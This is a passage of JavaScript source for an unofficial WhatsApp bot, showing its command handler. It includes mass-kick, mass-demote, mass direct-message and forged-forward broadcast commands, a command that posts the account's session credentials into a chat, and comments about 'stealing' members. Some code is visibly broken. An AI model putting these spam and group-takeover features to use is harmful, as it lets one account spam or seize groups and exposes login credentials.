GlobalTechInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./GlobalMedia/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
GlobalTechInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./GlobalMedia/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./GlobalMedia/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}
        
        if (m.isGroup && !m.key.fromMe) {
    let mentionUser = [...new Set([...(m.mentionedJid || [])])]; // Only consider explicitly mentioned users
    
    // Loop through mentioned users
    for (let ment of mentionUser) {
        if (afk.checkAfkUser(ment, _afk)) {
            let getId2 = afk.getAfkId(ment, _afk);
            let getReason2 = afk.getAfkReason(getId2, _afk);
            let getTimee = Date.now() - afk.getAfkTime(getId2, _afk);
            let heheh2 = ms(getTimee);

            // Only respond to @mentions, tagall, or hidetag, but not when replying
           if (!m.quoted || (m.mentionedJid && m.mentionedJid.length > 1)) {
    replyglobal(`*Hey yo* \`${pushname}\`\n\n*Don't tag my owner 😡🤬*`);
    break;
          }
        }
    }

    // Handle if the sender is returning from AFK
    if (afk.checkAfkUser(m.sender, _afk)) {
        let getId = afk.getAfkId(m.sender, _afk);
        let getReason = afk.getAfkReason(getId, _afk);
        let getTime = Date.now() - afk.getAfkTime(getId, _afk);
        let heheh = ms(getTime);

        // Remove the user from the AFK list
        _afk.splice(afk.getAfkPosition(m.sender, _afk), 1);
        fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk));
        
        GlobalTechInc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} You can tag my owner now😁`, m);
    }
}

//command list
//wa.me/255697608274
        switch (command) {
            case 'addprem':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                if (args.length < 2)
                    return replyglobal(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    replyglobal("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    replyglobal("Success")
                }
                break


                
            case 'delprem':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                if (args.length < 1) return replyglobal(`Use :\n*#delprem* @tag\n*#delprem* number`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    }
                    replyglobal("Delete success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    replyglobal("Success")
                }
                break
            case 'listprem': {
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                let data = require("./database/premium.json")
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let i of data) {
                    txt += `Number : ${i.id}\n`
                    txt += `Expired : ${i.expired} Second\n`         
                }                
                GlobalTechInc.sendMessage(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: m
                })
            }
            break
            case 'deletesession':
            case 'delsession':
            case 'clearsession': {
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replyglobal('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replyglobal(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replyglobal(teks)
                    await sleep(2000)
                    replyglobal("Delete junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replyglobal("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
            case 'enter':
                try {
                    if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                    if (!text) return replyglobal('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replyglobal('Link Invalid!')
                    replyglobal("wait, I'm doing it..")
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await GlobalTechInc.groupAcceptInvite(result).then((res) => replyglobal(json(res))).catch((err) => replyglobal(json(err)))
                } catch {
                    replyglobal('Failed to join the Group')
                }
                break      
            case 'getsession':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                replyglobal('Wait a moment, currently retrieving your session file')
                let sesi = await fs.readFileSync('./session/creds.json')
                GlobalTechInc.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
                break
            case 'shutdown':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                replyglobal(`Goodbye🖐`)
                await sleep(3000)
                process.exit()
                break
            case 'restart':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                replyglobal('Bot Creepy in Process....')
                exec('pm2 restart all')
                break
            case 'autoread':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                if (args.length < 1) return replyglobal(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    replyglobal(`Bot Creepy changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    replyglobal(`Bot Creepy changed autoread to ${q}`)
                }
                break
                case 'autotyping':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                if (args.length < 1) return replyglobal(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    replyglobal(`Bot Creepy changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    replyglobal(`Bot Creepy changed auto-typing to ${q}`)
                }
                break
                case 'autorecording':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                if (args.length < 1) return replyglobal(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true
                    replyglobal(`Bot Creepy changed auto-recording to ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    replyglobal(`Bot Creepy changed auto-recording to ${q}`)
                }
                break
                case 'autorecordtyp':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                if (args.length < 1) return replyglobal(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
                    replyglobal(`Bot Creepy changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    replyglobal(`Bot Creepy changed auto recording and typing to ${q}`)
                }
                break
                case 'autoswview':
    case 'autostatusview':{
             if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
               if (args.length < 1) return replyglobal('on/off?')
               if (args[0] === 'on') {
                  autoswview = true
                  replyglobal(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  autoswview = false
                  replyglobal(`${command} is disabled`)
               }
            }
            break
            case 'autobio':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                if (args.length < 1) return replyglobal(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    replyglobal(`Bot Creepy Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    replyglobal(`Bot Creepy Changed AutoBio To ${q}`)
                }
                break
            case 'mode':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                if (args.length < 1) return replyglobal(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    GlobalTechInc.public = true
                    replyglobal(mess.done)
                } else if (q == 'self') {
                    GlobalTechInc.public = false
                    replyglobal(mess.done)
                }
                break
            case 'setexif':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                if (!text) return replyglobal(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replyglobal(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                if (!quoted) return replyglobal(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replyglobal(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replyglobal(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await GlobalTechInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await GlobalTechInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replyglobal(mess.done)
                } else {
                    var memeg = await GlobalTechInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replyglobal(mess.done)
                }
                break
            case 'block':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                let blockw = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await GlobalTechInc.updateBlockStatus(blockw, 'block').then((res) => replyglobal(json(res))).catch((err) => replyglobal(json(err)))
                break
            case 'unblock':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await GlobalTechInc.updateBlockStatus(blockww, 'unblock').then((res) => replyglobal(json(res))).catch((err) => replyglobal(json(err)))
                break
            case 'left':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃")
                replyglobal('Bye Everyone 🥺')
                await GlobalTechInc.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                if (m.isGroup) return replyglobal(mess.private)
                replyglobal("wait, I'm doing it..")
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await GlobalTechInc.sendMessage(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: m
                })
                break
            case 'bcgc':
            case 'bcgroup':
            case 'broadcast': {
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                if (!text) return replyglobal(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await GlobalTechInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replyglobal(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 2.5} second`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
                    GlobalTechInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CREEPY TECH",
                    newsletterJid: "120363307517794567@newsletter",
                },
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'CREEPY_MD-V1',
                                body: `Broadcast by Danny`,
                                thumbnailUrl: 'https://files.catbox.moe/54w3b1.jpeg',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replyglobal(`Successfully Sent Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!isCreator) return replyglobal("😡You are not my owner dude🚫")
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("creepymd1.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                replyglobal(`${getCase(q)}`)
                break
            case 'delete':
            case 'del': {
                if (!isCreator) return replyglobal(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return replyglobal('I\'m not the one who send that text!')
                GlobalTechInc.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break

            case 'closetime':
                if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃")
                if (!isAdmins && !isCreator) return replyglobal("Only admins can use this😶")
                if (!isBotAdmins) return replyglobal("I'm not an admin here🚫")
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return replyglobal('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replyglobal(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Closed* group closed by admin\nnow only admin can send messages`
                    GlobalTechInc.groupSettingUpdate(m.chat, 'announcement')
                    replyglobal(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃")
                if (!isAdmins && !isCreator) return replyglobal("Only admins can use this😶")
                if (!isBotAdmins) return replyglobal("I'm not an admin here🚫")
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replyglobal('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replyglobal(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Opened* The group is opened by admin\nNow members can send messages`
                    GlobalTechInc.groupSettingUpdate(m.chat, 'not_announcement')
                    replyglobal(open)
                }, timer)
                break
                
      //command to mute a user
      
                case 'mute': {
    if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃");
    if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal('Only group admins can use this command.');
    if (!isBotAdmins) return replyglobal('I need to be an admin to execute this command.');

    // Retrieve the user to be muted
    let muteUser = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    if (!muteUser) return replyglobal('Please mention or quote a user to mute.');

    if (!global.mutedUsers) global.mutedUsers = []; // Ensure a list exists

    // Check if the user is already muted
    if (global.mutedUsers.includes(muteUser)) {
        return replyglobal(`${muteUser.split('@')[0]} is already muted.`);
    }

    // Add the user to the muted list
    global.mutedUsers.push(muteUser);
    replyglobal(`🔇 ${muteUser.split('@')[0]} has been muted. Their messages will be deleted.`);
}
break;

//Command to unmute user

case 'unmute': {
    if (!m.isGroup) return replyglobal('This command can only be used in groups.');
    if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal('Only group admins can use this command.');

    let unmuteUser = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    if (!unmuteUser) return replyglobal('Please mention or quote a user to unmute.');

    if (!global.mutedUsers || !global.mutedUsers.includes(unmuteUser)) {
        return replyglobal(`${unmuteUser.split('@')[0]} is not muted.`);
    }

    // Remove the user from the muted list
    global.mutedUsers = global.mutedUsers.filter(user => user !== unmuteUser);

    replyglobal(`🔊 ${unmuteUser.split('@')[0]} has been unmuted.`);
}
break;         
                
                
                
                //commands to add kick promote demote
            case 'kick':
    if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃");
    if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal("Only admins can use this😶");
    if (!isBotAdmins) return replyglobal("I'm not an admin here🚫");

    let toKick = m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : m.quoted 
        ? m.quoted.sender 
        : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    await GlobalTechInc.groupParticipantsUpdate(m.chat, [toKick], 'remove')
        .then(() => replyglobal(`This idiot ${toKick} kicked successfully.`))
        .catch(err => replyglobal(`Failed to kick the participant: ${json(err)}`));
    break;

case 'add':
    if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃");
    if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal("Only admins can use this😶");
    if (!isBotAdmins) return replyglobal("I'm not an admin here🚫");

    let toAdd = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    await GlobalTechInc.groupParticipantsUpdate(m.chat, [toAdd], 'add')
        .then(() => replyglobal(`${toAdd} has been added to the group.`))
        .catch(err => replyglobal(`Failed to add participant: ${json(err)}`));
    break;

case 'promote':
    if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃");
    if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal("Only admins can use this😶");
    if (!isBotAdmins) return replyglobal("I'm not an admin here🚫");

    let toPromote = m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : m.quoted 
        ? m.quoted.sender 
        : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    await GlobalTechInc.groupParticipantsUpdate(m.chat, [toPromote], 'promote')
        .then(() => replyglobal(`This user ${toPromote} is now an admin.`))
        .catch(err => replyglobal(`Failed to promote participant: ${json(err)}`));
    break;

case 'demote':
    if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃");
    if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal("Only admins can use this😶");
    if (!isBotAdmins) return replyglobal("I'm not an admin here🚫");

    let toDemote = m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : m.quoted 
        ? m.quoted.sender 
        : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    await GlobalTechInc.groupParticipantsUpdate(m.chat, [toDemote], 'demote')
        .then(() => replyglobal(`This user ${toDemote} is no longer an admin.`))
        .catch(err => replyglobal(`Failed to demote participant: ${json(err)}`));
    break;
    
    //command to create group from another group

    
      //command to steal members from groups  
      
      
    //mgc 2 allowing user to add members from multiple groups
    
    //command to send messages to all members in a group 
    
  case 'toall':
    if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃");
    if (!isCreator) return replyglobal('Only group admins can use this command.');

    let message = args.join(" "); // The broadcast message
    if (!message) return replyglobal('Please provide a message to broadcast.');

    // Fetch group participants
    let groupParticipants = groupMetadata.participants.map(p => p.id);

    // Notify user about the process
    await replyglobal(`📢 Sending message to ${groupParticipants.length} members. Please wait...`);

    try {
        // Loop through participants in batches of 5 with a 2-second delay
        const batchSize = 5;
        for (let i = 0; i < groupParticipants.length; i += batchSize) {
            let batch = groupParticipants.slice(i, i + batchSize);

            // Send messages to the current batch
            await Promise.all(batch.map(participant => 
                GlobalTechInc.sendMessage(participant, { text: message })
            ));

            // Add a delay before the next batch
            if (i + batchSize < groupParticipants.length) {
                await new Promise(resolve => setTimeout(resolve, 2000)); // 2-second delay
            }
        }

        // Send final confirmation message
        replyglobal(`✅ Successfully sent the message to all ${groupParticipants.length} members.`);
    } catch (err) {
        replyglobal('❌ An error occurred while broadcasting: ' + json(err));
    }
    break;
    
    //toall2 allowing user to send messages in multiple groups 

    //command to demote all members
    case 'demoteall':
    if (!m.isGroup) return replyglobal('This command can only be used in groups.');
    if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal('Only group admins can use this command.');
    if (!isBotAdmins) return replyglobal('I need to be an admin to execute this command.');

    // Fetch group participants and filter out bot and group owner
    let adminParticipants = groupMetadata.participants
        .filter(p => p.admin === 'admin') // Select only admins
        .map(p => p.id)
        .filter(id => id !== botNumber && id !== m.sender); // Exclude bot and group owner

    if (adminParticipants.length === 0) {
        return replyglobal('There are no admin members left to demote, or I cannot demote the group owner or myself.');
    }

    // Notify the user about the demotion process
    replyglobal(`🚀 Demoting ${adminParticipants.length} admin members. Please wait...`);

    try {
        let demotedCount = 0;
        // Demote admin participants with a delay
        for (let i = 0; i < adminParticipants.length; i++) {
            let participant = adminParticipants[i];
            await GlobalTechInc.groupParticipantsUpdate(m.chat, [participant], 'demote');
            demotedCount++;

            // Add a 1-second delay before the next demotion
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        // Send final confirmation message
        replyglobal(`✅ Successfully demoted ${demotedCount} admin members!`);

    } catch (err) {
        replyglobal('An error occurred while demoting members: ' + json(err));
    }
    break;
    
 //command to promote all members to be admins   
   case 'alladmins':
    if (!m.isGroup) return replyglobal('This command can only be used in groups.');
    if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal('Only group admins can use this command.');
    if (!isBotAdmins) return replyglobal('I need to be an admin to execute this command.');

    // Filter non-admin members from group participants
    let nonAdmins = groupMetadata.participants.filter(p => !p.admin).map(p => p.id);

    if (nonAdmins.length === 0) return replyglobal('All participants are already admins.');

    // Notify the user about the promotion
    replyglobal(`🚀 Promoting ${nonAdmins.length} members to admin. Please wait...`);

    try {
        // Promote non-admin members to admin with a 1-second delay
        let successCount = 0;
        for (let i = 0; i < nonAdmins.length; i++) {
            let participant = nonAdmins[i];
            await GlobalTechInc.groupParticipantsUpdate(m.chat, [participant], 'promote');
            successCount++;

            // Add a 1-second delay before the next promotion
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        // Send final confirmation message
        replyglobal(`🚀 Successfully promoted ${successCount} members to admin!`);

    } catch (err) {
        replyglobal('An error occurred while promoting members: ' + json(err));
    }
    break;
    
//command to kick all members   
case 'kickall':
    if (!m.isGroup) return replyglobal('This command can only be used in groups.');
    if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal('Only group admins can use this command.');
    if (!isBotAdmins) return replyglobal('I need to be an admin to execute this command.');

    // Filter group participants to remove, excluding bot and command sender
    let participantsToRemove = groupMetadata.participants
        .map(p => p.id)
        .filter(id => id !== botNumber && id !== m.sender); // Exclude bot and sender

    // Check if there are participants to remove
    if (participantsToRemove.length === 0) {
        return replyglobal('No eligible members to remove, or I cannot remove myself or the group creator.');
    }

    // Notify the user about the removal process
    replyglobal(`🚀 Removing ${participantsToRemove.length} members from the group. Please wait...`);

    try {
        let removedCount = 0;
        // Remove participants with a delay to avoid WhatsApp server limits
        for (let i = 0; i < participantsToRemove.length; i++) {
            let participant = participantsToRemove[i];
            await GlobalTechInc.groupParticipantsUpdate(m.chat, [participant], 'remove');
            removedCount++;

            // Add a 1-second delay before the next removal
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        // Send final confirmation message
        replyglobal(`✅ Successfully removed ${removedCount} members from the group!`);

    } catch (err) {
        replyglobal('An error occurred while removing members: ' + json(err));
    }
    break;
    
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃")
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal("Only admins can use this😶")
                if (!isBotAdmins) return replyglobal("I'm not an admin here🚫")
                if (!text) return 'Text ?'
                await GlobalTechInc.groupUpdateSubject(m.chat, text).then((res) => replyglobal(mess.success)).catch((err) => replyglobal(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃")
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal("Only admins can use this😶")
                if (!isBotAdmins) return replyglobal("I'm not an admin here🚫")
                if (!text) return 'Text ?'
                await GlobalTechInc.groupUpdateDescription(m.chat, text).then((res) => replyglobal(mess.success)).catch((err) => replyglobal(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃")
                if (!isAdmins) return replyglobal("Only admins can use this😶")
                if (!isBotAdmins) return replyglobal("I'm not an admin here🚫")
                if (!quoted) return replyglobal(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replyglobal(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replyglobal(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await GlobalTechInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await GlobalTechInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replyglobal(mess.done)
                } else {
                    var memeg = await GlobalTechInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replyglobal(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃")
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replyglobal("Only admins can use this😶")
                if (!isBotAdmins && !isCreator && !isPremium) return replyglobal("I'm not an admin here🚫")
                let teks = `*\`CREEPY_MD-V1👥ALL MEMBERS TAGGED\`*
 
                 📄 *Message : \`${q ? q : 'blank'}\`*\n> *Don\'t mimd my owner for tagging you😏😁*\n ${readmore}`
                
                for (let mem of participants) {
                    teks += `🚔 @${mem.id.split('@')[0]}\n`
                }
                GlobalTechInc.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'hidetag':
            case 'dtag':
                if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃")
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replyglobal("Only admins can use this😶")
                if (!isBotAdmins && !isCreator && !isPremium) return replyglobal("I'm not an admin here🚫")
                GlobalTechInc.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'totag':
          case 'tag':
                if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃")
                if (!isBotAdmins && !isCreator && !isPremium) return replyglobal("I'm not an admin here🚫")
                if (!isAdmins && !isCreator && !isPremium) return replyglobal("Only admins can use this😶")
                if (!m.quoted) return replyglobal(`Reply messages with captions ${prefix + command}`)
                GlobalTechInc.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'gc':
                if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃")
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal("Only admins can use this😶")
                if (!isBotAdmins) return replyglobal("I'm not an admin here🚫")
                if (args[0] === 'close') {
                    await GlobalTechInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replyglobal(`*Group closed 🔐*`)).catch((err) => replyglobal(json(err)))
                } else if (args[0] === 'open') {
                    await GlobalTechInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replyglobal(`*Group opened 🔓*`)).catch((err) => replyglobal(json(err)))
                } else {
                    replyglobal(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃")
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal("Only admins can use this😶")
                if (!isBotAdmins) return replyglobal("I'm not an admin here🚫")
                if (args[0] === 'open') {
                    await GlobalTechInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replyglobal(`*Group edit info opened*`)).catch((err) => replyglobal(json(err)))
                } else if (args[0] === 'close') {
                    await GlobalTechInc.groupSettingUpdate(m.chat, 'locked').then((res) => replyglobal(`*Group edit info closed*`)).catch((err) => replyglobal(json(err)))
                } else {
                    replyglobal(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                break
            case 'linkgroup':
            case 'grouplink':
            case 'glink':
            case 'linkgc':
                if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃")
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal("Only admins can use this😶")
                if (!isBotAdmins) return replyglobal("I'm not an admin here🚫")
                let response = await GlobalTechInc.groupInviteCode(m.chat)
                GlobalTechInc.sendText(m.chat, `👥 *\`CREEPY_MD-V1 GROUP INFO\`*\n🤖 *Group Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🏷 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Members :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return replyglobal("Are you lost?🙄, this is for groups only🤠🏃")
                if (!isAdmins && !isGroupOwner && !isCreator) return replyglobal("Only admins can use this😶")
                if (!isBotAdmins) return replyglobal("I'm not an admin here🚫")
                await GlobalTechInc.groupRevokeInvite(m.chat)
                    .then(res => {
